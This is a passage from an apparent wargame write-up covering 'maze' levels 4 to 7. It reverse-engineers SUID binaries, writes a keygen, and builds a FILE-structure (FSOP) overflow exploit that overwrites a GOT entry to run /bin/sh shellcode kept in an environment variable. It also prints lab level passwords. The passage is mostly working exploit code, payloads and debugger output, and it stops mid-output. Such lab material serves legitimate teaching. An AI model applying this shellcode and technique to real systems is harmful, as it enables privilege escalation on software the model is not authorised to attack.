/tmp/file #!/bin/sh /bin/bash -p # BBBBBBBBBBBB?.CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  Now we run it and complete the level:\nmaze4@maze:~$ /maze/maze4 /tmp/file valid file, executing bash-4.4$ whoami maze5 bash-4.4$ cat /etc/maze_pass/maze5 ishipaeroo  Level 5 -\u0026gt; 6 For this level, we have a binary /maze/maze5 that we can reverse using Ghidra and get this decompiled main function:\nint main() { size_t sVar1; long lVar2; int iVar3; char pass[9]; char user[9]; puts(\"X----------------\"); printf(\" Username: \"); __isoc99_scanf(\"%8s\", user); printf(\" Key: \"); __isoc99_scanf(\"%8s\", pass); sVar1 = strlen(user); if ((sVar1 == 8) \u0026amp;\u0026amp; (sVar1 = strlen(pass), sVar1 == 8)) { lVar2 = ptrace(PTRACE_TRACEME, 0, 0, 0); if (lVar2 == 0) { iVar3 = foo(user, pass); if (iVar3 == 0) { puts(\"\\nNah, wrong.\"); } else { puts(\"\\nYeh, here\\'s your shell\"); system(\"/bin/sh\"); } } else { puts(\"\\nnahnah...\"); } return 0; } puts(\"Wrong length you!\"); /* WARNING: Subroutine does not return */ exit(-1); }  Basically, the program requests a username and a password. Moreover, it disallows the use of GDB, strace or ltrace because ptrace will not return 0.\nAfter that, the input username and password are sent to foo (only if both have a length of 8 bytes):\nint foo(char *s, char *a) { int iVar1; int iVar2; size_t sVar3; char cStack22; char p[9]; int x; int i; p._0_4_ = 0x6e697270; p._4_4_ = 0x6c6f6c74; p[8] = '\\0'; for (i = 0; sVar3 = strlen(s), (uint)i \u0026lt; sVar3; i = i + 1) { p[i] = p[i] - (s[i] + -0x41 + (char)i * '\\x02'); } do { iVar1 = i + -1; if (i == 0) { return 1; } iVar2 = i + -1; i = iVar1; } while (p[iVar2] == a[iVar1]); return 0; }  The decompiled source code is a little weird. The for loop is doing an operation using the username and a key which is \u0026quot;printlol\u0026quot; (0x6e697270 and 0x6c6f6c74 into bytes format). Then, the do-while loop only checks that the password is the same as the result of the previous operation (character by character).\nHence, we can rewrite the for loop into another file and obtain the expected password:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void main(int argc, char** argv) { if (argc != 2) return; int i; char* key = \"printlol\"; char* username = argv[1]; char password[8]; printf(\"Key: %s\\n\", key); printf(\"Username: %s\\n\", username); for (i = 0; i \u0026lt; 8; i++) { password[i] = key[i] - (username[i] - 0x41 + i * 2); } printf(\"Expected password: %s\\n\", password); }  Now, we compile it an execute it passing a username as argument:\n$ gcc -o password password.c $ ./password AAAAAAAA Key: printlol Username: AAAAAAAA Expected password: ppehlbc^  And so, we can use the program and get a shell as maze6:\nmaze5@maze:~$ /maze/maze5 X---------------- Username: AAAAAAAA Key: ppehlbc^ Yeh, here's your shell $ whoami maze6 $ cat /etc/maze_pass/maze6 epheghuoli  Level 6 -\u0026gt; 7 The decompiled source code for /maze/maze6 is shown below:\nint main(int argc, char **argv) { FILE *__stream; size_t __n; char buf[256]; FILE *fp; if (argc != 3) { printf(\"%s file2write2 string\\n\", *argv); /* WARNING: Subroutine does not return */ exit(-1); } __stream = fopen(argv[1], \"a\"); if (__stream == (FILE *) 0x0) { perror(\"fopen\"); /* WARNING: Subroutine does not return */ exit(-1); } strcpy(buf, argv[2]); __n = strlen(buf); memfrob(buf, __n); fprintf(__stream, \"%s : %s\\n\", argv[1], buf); /* WARNING: Subroutine does not return */ exit(0); } First we notice the use of strcpy, which is vulnerable to Buffer Overflow as we control the contents of the source string, that will be copied to the destination variable (buf), which has only 256 bytes reserved.\nUnfortunately, there is no return instruction, so the Buffer Overflow will not be useful to redirect program execution.\nMoreover, after the strcpy, the data copied to buf is modified by memfrob. This function encrypts each byte using a XOR operation with 42 (0x2a) as key. This must be taken into account because we will create a payload and use a XOR cipher with key 42, so that memfrob reverts our encryption and we copy the desired data. Plus, this methodology will allow us to send null bytes (otherwise, strcpy will not work as expected because a null byte terminates a string in C language).\nSince we cannot overwrite a saved return instruction, we need to modify some local variables (which are saved in the stack). The only one that matters is a pointer to a FILE structure, so this must be the way.\nA quick search on the Internet unveils a technique called File Stream Oriented Programming (FSOP), which consists of forging a FILE structure to gain an arbitrary write primitive. There is a lot of information there.\nFirst of all, let\u0026rsquo;s execute the program:\nmaze6@maze:~$ /maze/maze6 /maze/maze6 file2write2 string maze6@maze:~$ /maze/maze6 file.txt AAAA fopen: Permission denied maze6@maze:~$ cd /tmp maze6@maze:/tmp$ echo AAAA  asdf.txt maze6@maze:/tmp$ /maze/maze6 asdf.txt AAAA fopen: Permission denied  This behavior is strange. It seems that the program does not have enough permissions to write data to asdf.txt. Let\u0026rsquo;s check that permissions:\nmaze6@maze:/tmp$ ls -l --time-style=+ asdf.txt -rw-r--r-- 1 maze6 root 5 asdf.txt  Alright, since /maze/maze6 is a SUID binary, it is being executed as user maze7, but the file asdf.txt belongs to maze6 and others only are able to read. Therefore, we must change its permissions at least to rw:\nmaze6@maze:/tmp$ chmod 666 asdf.txt maze6@maze:/tmp$ ls -l --time-style=+ asdf.txt -rw-rw-rw- 1 maze6 root 5 asdf.txt maze6@maze:/tmp$ /maze/maze6 asdf.txt AAAA maze6@maze:/tmp$ cat asdf.txt AAAA asdf.txt : kkkk  Now everything is correct and we can start working.\nFor the sake of solving this level, let\u0026rsquo;s set a breakpoint before fprintf and examine the legitimate FILE structure from the remote machine. Curiously, GDB has changed the prompt. This time I will use gdb-peda (just because gef is not installed and pwndbg does not work properly):\nmaze6@maze:/tmp$ gdb -q /maze/maze6 Reading symbols from /maze/maze6...done. warning: ~/.gdbinit.local: No such file or directory gdb$ source /usr/local/peda/peda.py gdb-peda$  We disassemble the main function and set a breakpoint right before fprintf is called:\ngdb-peda$ disassemble main Dump of assembler code for function main: 0x0804855b \u0026lt;+0\u0026gt;: push ebp 0x0804855c \u0026lt;+1\u0026gt;: mov ebp,esp 0x0804855e \u0026lt;+3\u0026gt;: sub esp,0x104 ... 0x08048606 \u0026lt;+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x0804860b \u0026lt;+176\u0026gt;: add esp,0x10 0x0804860e \u0026lt;+179\u0026gt;: push 0x0 0x08048610 \u0026lt;+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; End of assembler dump. gdb-peda$ break *0x08048606 Breakpoint 1 at 0x8048606: file maze6.c, line 40.  Now we can run the program:\ngdb-peda$ run asdf.txt AAAA Starting program: /maze/maze6 asdf.txt AAAA [----------------------------------registers-----------------------------------] EAX: 0xffffd7cd (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4d8 --\u0026gt; 0x0 EDX: 0xffffd4d4 (\"kkkk\") ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd5d8 --\u0026gt; 0x0 ESP: 0xffffd4c4 --\u0026gt; 0x804a008 --\u0026gt; 0xfbad3484 EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0x804a008 --\u0026gt; 0xfbad3484 arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd7cd (\"asdf.txt\") arg[3]: 0xffffd4d4 (\"kkkk\") [------------------------------------stack-------------------------------------] 0000| 0xffffd4c4 --\u0026gt; 0x804a008 --\u0026gt; 0xfbad3484 0004| 0xffffd4c8 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd4cc --\u0026gt; 0xffffd7cd (\"asdf.txt\") 0012| 0xffffd4d0 --\u0026gt; 0xffffd4d4 (\"kkkk\") 0016| 0xffffd4d4 (\"kkkk\") 0020| 0xffffd4d8 --\u0026gt; 0x0 0024| 0xffffd4dc --\u0026gt; 0xf7ff1781 (add esp,0x10) 0028| 0xffffd4e0 --\u0026gt; 0xf7ff215c (add esi,0xaea4) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x08048606 in main (argc=0x3, argv=0xffffd674) at maze6.c:40 40 maze6.c: No such file or directory.  At this point, we see that the pointer to the FILE structure is 0x804a008 (the first argument for fprintf). We can extract the attributes of this structure as follows:\ngdb-peda$ p *((FILE*) 0x804a008) $1 = { _flags = 0xfbad3484, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xf7fc5cc0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 0x3, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x804a0a0, _offset = 0xffffffffffffffff, __pad1 = 0x0, __pad2 = 0x804a0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 39 times\u0026gt; }  Important attributes to consider are:\n _chain = 0xf7fc5cc0 _lock = 0x804a0a0 _offset = 0xffffffffffffffff  There is a class in pwntools called FileStructure that might be useful, but I did not make it to work properly.\nAlso, we must check the attribute types of the FILE structure and how is this structure stored in memory:\ngdb-peda$ ptype FILE type = struct _IO_FILE { int _flags; char *_IO_read_ptr; char *_IO_read_end; char *_IO_read_base; char *_IO_write_base; char *_IO_write_ptr; char *_IO_write_end; char *_IO_buf_base; char *_IO_buf_end; char *_IO_save_base; char *_IO_backup_base; char *_IO_save_end; struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; __off64_t _offset; void *__pad1; void *__pad2; void *__pad3; void *__pad4; size_t __pad5; int _mode; char _unused2[40]; } gdb-peda$ x/40x 0x804a008 0x804a008: 0xfbad3484 0x00000000 0x00000000 0x00000000 0x804a018: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a028: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a038: 0x00000000 0xf7fc5cc0 0x00000003 0x00000000 0x804a048: 0x00000000 0x00000000 0x0804a0a0 0xffffffff 0x804a058: 0xffffffff 0x00000000 0x0804a0ac 0x00000000 0x804a068: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a078: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a088: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a098: 0x00000000 0xf7fc3960 0x00000000 0x00000000  There is another relevant value here: vtable, which is 0xf7fc3960.\nIn order to write arbitrary data into memory, we need to control attributes _IO_buf_base and _IO_buf_end, so that these attributes point to the starting and ending addresses where we want to write (the length will be _IO_buf_end - _IO_buf_base).\nSince we have a Buffer Overflow vulnerability, we are able to modify the pointer to the legitimate FILE structure and force it to point to a malicious one loaded onto the stack.\nFor that, we need to calculate the offset to overwrite the first argument to fprintf. This can be done with cyclic from pwntools (we use the XOR cipher so that we can compute the offset afterwards):\ngdb-peda$ run asdf.txt \"$(python -c 'from pwn import cyclic; print(\"\".join(chr(42 ^ ord(b)) for b in cyclic(270)))')\" Starting program: /maze/maze6 asdf.txt \"$(python -c 'from pwn import cyclic; print(\"\".join(chr(42 ^ ord(b)) for b in cyclic(270)))')\" [----------------------------------registers-----------------------------------] EAX: 0xffffd6c3 (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4d2 --\u0026gt; 0xd5640000 EDX: 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd4c8 (\"paacqaacra\") ESP: 0xffffd3b4 (\"oaac\\277\\206\\004\\b\\303\\326\\377\\377\\304\\323\\377\\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab\"...) EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0x6361616f ('oaac') arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd6c3 (\"asdf.txt\") arg[3]: 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) [------------------------------------stack-------------------------------------] 0000| 0xffffd3b4 (\"oaac\\277\\206\\004\\b\\303\\326\\377\\377\\304\\323\\377\\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab\"...) 0004| 0xffffd3b8 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd3bc --\u0026gt; 0xffffd6c3 (\"asdf.txt\") 0012| 0xffffd3c0 --\u0026gt; 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) 0016| 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) 0020| 0xffffd3c8 (\"baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaac\"...) 0024| 0xffffd3cc (\"caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaac\"...) 0028| 0xffffd3d0 (\"daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaac\"...) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x08048606 in main (argc=0x6172, argv=0xffffd564) at maze6.c:40 40 in maze6.c  And the first parameter is overwritten with \u0026quot;oaac\u0026quot;, which results in an offset of 256 bytes:\n$ pwn cyclic -l oaac 256  Notice that the actual pattern is stored in the stack 16 bytes after the offset:\ngdb-peda$ x/50x $esp 0xffffd3b4: 0x6361616f 0x080486bf 0xffffd6c3 0xffffd3c4 0xffffd3c4: 0x61616161 0x61616162 0x61616163 0x61616164 0xffffd3d4: 0x61616165 0x61616166 0x61616167 0x61616168 0xffffd3e4: 0x61616169 0x6161616a 0x6161616b 0x6161616c 0xffffd3f4: 0x6161616d 0x6161616e 0x6161616f 0x61616170 0xffffd404: 0x61616171 0x61616172 0x61616173 0x61616174 0xffffd414: 0x61616175 0x61616176 0x61616177 0x61616178 0xffffd424: 0x61616179 0x6261617a 0x62616162 0x62616163 0xffffd434: 0x62616164 0x62616165 0x62616166 0x62616167 0xffffd444: 0x62616168 0x62616169 0x6261616a 0x6261616b 0xffffd454: 0x6261616c 0x6261616d 0x6261616e 0x6261616f 0xffffd464: 0x62616170 0x62616171 0x62616172 0x62616173 0xffffd474: 0x62616174 0x62616175  Hence, instead of \u0026quot;oaac\u0026quot; we will place 0xffffd3c4 so that the FILE structure starts there and the first argument for fprintf points to that position on the stack.\nNow we can craft the malicious FILE structure in order to load it into the stack. For the moment let\u0026rsquo;s try to overwrite an environment variable, for instance USER=maze6):\ngdb-peda$ shell echo $USER maze6 gdb-peda$ find USER Searching for 'USER' in: None ranges Found 1 results, display max 1 items: [stack] : 0xffffde6d (\"USER=maze6\")  Hence, these will be the values for the FILE structure:\n _chain = 0xf7fc5cc0 _lock = 0x804a0a0 _offset = 0xffffffffffffffff vtable = 0xf7fc3960 _IO_buf_base = 0xffffde6d _IO_buf_end = 0xffffde6d + 4  After some trial and error, we can build this Python script that puts these fields into the payload:\n#!/usr/bin/env python3 import os import struct env_addr = 0xffffde6d file_addr = 0xffffd3c8 length = 256 p32 = lambda h: struct.pack('\u0026lt;I', h) payload = b'ASDF' payload += b'\\0' * 28 payload += p32(env_addr) payload += p32(env_addr + 4) payload += b'\\0' * 16 payload += p32(0xf7fc5cc0) payload += b'\\0' * 16 payload += p32(0x0804a0a0) payload += b'\\xff' * 8 payload += b'\\0' * 64 payload += p32(0xf7fc3960) payload += b'\\0' * (length - len(payload)) payload += p32(file_addr) os.write(1, bytes(42 ^ b for b in payload))  We can check that all the values are at the expected position using GDB:\ngdb-peda$ run asdf.txt \"$(python3 maze6.py)\" Starting program: /maze/maze6 asdf.txt \"$(python3 maze6.py)\" [----------------------------------registers-----------------------------------] EAX: 0xffffd6cd (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4d8 --\u0026gt; 0x0 EDX: 0xffffd3d4 (\"ASDF\") ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd4d8 --\u0026gt; 0x0 ESP: 0xffffd3c4 --\u0026gt; 0xffffd3d8 --\u0026gt; 0x0 EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0xffffd3d8 --\u0026gt; 0x0 arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd6cd (\"asdf.txt\") arg[3]: 0xffffd3d4 (\"ASDF\") [------------------------------------stack-------------------------------------] 0000| 0xffffd3c4 --\u0026gt; 0xffffd3d8 --\u0026gt; 0x0 0004| 0xffffd3c8 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd3cc --\u0026gt; 0xffffd6cd (\"asdf.txt\") 0012| 0xffffd3d0 --\u0026gt; 0xffffd3d4 (\"ASDF\") 0016| 0xffffd3d4 (\"ASDF\") 0020| 0xffffd3d8 --\u0026gt; 0x0 0024| 0xffffd3dc --\u0026gt; 0x0 0028| 0xffffd3e0 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x08048606 in main (argc=0x3, argv=0xffffd574) at maze6.c:40 40 in maze6.c gdb-peda$ p *((FILE*) 0xffffd3d8) $3 = { _flags = 0x0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0xffffde6d \"USER=maze6\", _IO_buf_end = 0xffffde74 \"ze6\", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xf7fc5cc0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x804a0a0, _offset = 0xffffffffffffffff, __pad1 = 0x0, __pad2 = 0x0, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 39 times\u0026gt; }  Everything is correct. If we continue, we see the value modified:\ngdb-peda$ x/s 0xffffde6d 0xffffde6d: \"USER=maze6\" gdb-peda$ next asdf.txt : ASDF ... gdb-peda$ x/s 0xffffde6d 0xffffde6d: \" : ASDFze6\"  At this point, the idea is to overwrite the Global Offset Table (GOT) entry for exit to jump to the address of an environment variable that will contain shellcode to spawn a shell.\nWe can take a common 32-bit shellcode and store it into an environment variable:\nmaze6@maze:/tmp$ export TEST=$(python -c 'print(\"\\x90\" * 20 + \"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze6@maze:/tmp$ echo $TEST | xxd 00000000: 9090 9090 9090 9090 9090 9090 9090 9090 ................ 00000010: 9090 9090 31c9 6a0b 5851 682f 2f73 6868 ....1.j.XQh//shh 00000020: 2f62 696e 89e3 31d2 cd80 0a /bin..1....  maze6@maze:/tmp$ gdb -q /maze/maze6 Reading symbols from /maze/maze6...done. warning: ~/.gdbinit.local: No such file or directory gdb$ source /usr/local/peda/peda.py gdb-peda$ disassemble main Dump of assembler code for function main: 0x0804855b \u0026lt;+0\u0026gt;: push ebp 0x0804855c \u0026lt;+1\u0026gt;: mov ebp,esp 0x0804855e \u0026lt;+3\u0026gt;: sub esp,0x104 ... 0x08048606 \u0026lt;+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x0804860b \u0026lt;+176\u0026gt;: add esp,0x10 0x0804860e \u0026lt;+179\u0026gt;: push 0x0 0x08048610 \u0026lt;+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; gdb-peda$ break main Breakpoint 1 at 0x8048564: file maze6.c, line 29. gdb-peda$ break *0x8048606 Breakpoint 2 at 0x8048606: file maze6.c, line 40. gdb-peda$ disassemble 0x80483f0 Dump of assembler code for function exit@plt: 0x080483f0 \u0026lt;+0\u0026gt;: jmp DWORD PTR ds:0x80498dc 0x080483f6 \u0026lt;+6\u0026gt;: push 0x18 0x080483fb \u0026lt;+11\u0026gt;: jmp 0x80483b0 End of assembler dump. gdb-peda$ run asdf.txt AAAA Starting program: /maze/maze6 asdf.txt AAAA ... Breakpoint 1, main (argc=0x3, argv=0xffffd644) at maze6.c:29 29 maze6.c: No such file or directory. gdb-peda$ find TEST Searching for 'TEST' in: None ranges Found 2 results, display max 2 items: libc : 0xf7f6fd88 (\"TEST\") [stack] : 0xffffde29 (\"TEST=\", '\\220' \u0026lt;repeats 20 times\u0026gt;, \"\\061\\311j\\vXQh//shh/bin\\211\\343\\061\\322̀\")  From the previous GDB output we get the address of exit at GOT and the address of TEST in the stack. Now we can update the values on the exploit as follows:\n#!/usr/bin/env python3 import os import struct exit_got = 0x080498dc env_addr = 0xffffde29 file_addr = 0xffffd3a8 length = 256 p32 = lambda h: struct.pack('\u0026lt;I', h) payload = p32(env_addr + 5) payload += b'\\0' * 28 payload += p32(exit_got - 3) payload += p32(exit_got + 5) payload += b'\\0' * 16 payload += p32(0xf7fc5cc0) payload += b'\\0' * 16 payload += p32(0x0804a0a0) payload += b'\\xff' * 8 payload += b'\\0' * 64 payload += p32(0xf7fc3960) payload += b'\\0' * (length - len(payload)) payload += p32(file_addr) os.write(1, bytes(42 ^ b for b in payload))  The address of the FILE structure has changed, this can be checked as before using GDB. Notice that we are writing into exit_got - 3 because \u0026quot; : \u0026quot; will be written as well. That way, we can write 4 bytes at exit_got until exit_got + 4. Plus, notice that the address we are writing is env_addr + 5 since the contents start at the fifth position (TEST=...), although there are some nop instructions as padding just in case.\nNow, if we run the exploit, we see that everything is correct:\ngdb-peda$ run asdf.txt \"$(python3 maze6.py)\" Starting program: /maze/maze6 asdf.txt \"$(python3 maze6.py)\" [----------------------------------registers-----------------------------------] EAX: 0xffffd69d (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4a8 --\u0026gt; 0x0 EDX: 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd4a8 --\u0026gt; 0x0 ESP: 0xffffd394 --\u0026gt; 0xffffd3a8 --\u0026gt; 0x0 EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0xffffd3a8 --\u0026gt; 0x0 arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd69d (\"asdf.txt\") arg[3]: 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 [------------------------------------stack-------------------------------------] 0000| 0xffffd394 --\u0026gt; 0xffffd3a8 --\u0026gt; 0x0 0004| 0xffffd398 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd39c --\u0026gt; 0xffffd69d (\"asdf.txt\") 0012| 0xffffd3a0 --\u0026gt; 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 0016| 0xffffd3a4 --\u0026gt; 0xffffde2e --\u0026gt; 0x90909090 0020| 0xffffd3a8 --\u0026gt; 0x0 0024| 0xffffd3ac --\u0026gt; 0x0 0028| 0xffffd3b0 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 2, 0x08048606 in main (argc=0x3, argv=0xffffd544) at maze6.c:40 40 in maze6.c gdb-peda$ p *((FILE*) 0xffffd3a8) $2 = { _flags = 0x0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x80498d9 \"\\224\\351\\367\\366\\203\\004\\bP\\n\\351\\367\\220\\241\\342\\367\u0026\\204\\004\\b\\240\\377\\346\", \u0026lt;incomplete sequence \\367\u0026gt;, _IO_buf_end = 0x80498e1 \"\\n\\351\\367\\220\\241\\342\\367\u0026\\204\\004\\b\\240\\377\\346\", \u0026lt;incomplete sequence \\367\u0026gt;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xf7fc5cc0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x804a0a0, _offset = 0xffffffffffffffff, __pad1 = 0x0, __pad2 